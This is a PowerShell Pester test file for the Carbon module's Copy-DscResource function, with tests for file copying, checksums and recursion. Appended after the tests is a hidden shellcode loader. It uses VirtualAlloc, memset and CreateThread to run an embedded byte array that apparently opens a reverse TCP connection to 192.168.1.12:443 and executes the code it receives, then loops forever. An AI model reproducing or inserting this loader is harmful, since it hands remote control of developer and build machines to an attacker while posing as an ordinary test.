











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$sourceRoot = $null;
$destinationRoot = $null

function Assert-Copy
{
    param(
        $SourceRoot,

        $DestinationRoot,

        [Switch]
        $Recurse
    )

    Get-ChildItem -Path $SourceRoot | ForEach-Object {

        $destinationPath = Join-Path -Path $DestinationRoot -ChildPath $_.Name

        if( $_.PSIsContainer )
        {
            if( $Recurse )
            {
                Test-Path -PathType Container -Path $destinationPath | Should -BeTrue
                Assert-Copy -SourceRoot $_.FullName -DestinationRoot $destinationPath -Recurse
            }
            else
            {
                $destinationPath | Should -Not -Exist
            }
            return
        }
        else
        {
            Test-Path -Path $destinationPath -PathType Leaf | Should -BeTrue -Because ($_.FullName)
        }

        $sourceHash = Get-FileHash -Path $_.FullName | Select-Object -ExpandProperty 'Hash'
        $destinationHashPath = '{0}.checksum' -f $destinationPath
        Test-Path -Path $destinationHashPath -PathType Leaf | Should -BeTrue
        
        $destinationHash = [IO.File]::ReadAllText($destinationHashPath)
        $destinationHash | Should -Be $sourceHash
    }
}

Describe 'Copy-DscResource' {
    
    BeforeEach {
        $Global:Error.Clear()
        $script:destinationRoot = Join-Path -Path $TestDrive.FullName -ChildPath ('D.{0}' -f [IO.Path]::GetRandomFileName())
        New-Item -Path $destinationRoot -ItemType 'Directory'
        $script:sourceRoot = Join-Path -Path $TestDrive.FullName -ChildPath ('S.{0}' -f [IO.Path]::GetRandomFileName())
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'Dir1\Dir3\zip.zip') -Force
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'Dir1\zip.zip') 
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'Dir2') -ItemType 'Directory'
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'zip.zip')
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'mov.mof')
        New-Item -Path (Join-Path -Path $sourceRoot -ChildPath 'msi.msi')
    }
    
    It 'should copy files' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot
        $result | Should -BeNullOrEmpty
        Assert-Copy $sourceRoot $destinationRoot
    }
    
    It 'should pass thru copied files' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru -Recurse
        $result | Should -Not -BeNullOrEmpty
        Assert-Copy $sourceRoot $destinationRoot -Recurse
        $result.Count | Should -Be 10
        foreach( $item in $result )
        {
            $item.FullName | Should -BeLike ('{0}*' -f $destinationRoot)
        }
    }
    
    It 'should only copy changed files' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
        $result | Should -Not -BeNullOrEmpty
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
        $result | Should -BeNullOrEmpty
        [IO.File]::WriteAllText((Join-path -Path $sourceRoot -ChildPath 'mov.mof'), ([Guid]::NewGuid().ToString()))
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
        $result | Should -Not -BeNullOrEmpty
        $result.Count | Should -Be 2
        $result[0].Name | Should -Be 'mov.mof'
        $result[1].Name | Should -Be 'mov.mof.checksum'
    }
    
    It 'should always regenerate checksums' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
        $result | Should -Not -BeNullOrEmpty
        [IO.File]::WriteAllText((Join-Path -Path $sourceRoot -ChildPath 'zip.zip.checksum'), 'E4F0D22EE1A26200BA320E18023A56B36FF29AA1D64913C60B46CE7D71E940C6')
        try
        {
            $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
            $result | Should -BeNullOrEmpty
            [IO.File]::WriteAllText((Join-Path -Path $sourceRoot -ChildPath 'zip.zip'), ([Guid]::NewGuid().ToString()))
    
            $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru
            $result | Should -Not -BeNullOrEmpty
            $result[0].Name | Should -Be 'zip.zip'
            $result[1].Name | Should -Be 'zip.zip.checksum'
        }
        finally
        {
            Get-ChildItem -Path $sourceRoot -Filter '*.checksum' | Remove-Item
            Clear-Content -Path (Join-Path -Path $sourceRoot -ChildPath 'zip.zip')
        }
    }
    
    It 'should copy recursively' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -Recurse
        $result | Should -BeNullOrEmpty
        Assert-Copy -SourceRoot $sourceRoot -Destination $destinationRoot -Recurse
    }
    
    It 'should force copy' {
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru -Recurse
        $result | Should -Not -BeNullOrEmpty
        Assert-Copy $sourceRoot $destinationRoot -Recurse
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru -Recurse
        $result | Should -BeNullOrEmpty
        $result = Copy-DscResource -Path $sourceRoot -Destination $destinationRoot -PassThru -Force -Recurse
        $result | Should -Not -BeNullOrEmpty
        Assert-Copy $sourceRoot $destinationRoot -Recurse
    }
}

$zHI = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $zHI -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tzF=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tzF.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tzF,0,0,0);for (;;){Start-sleep 60};

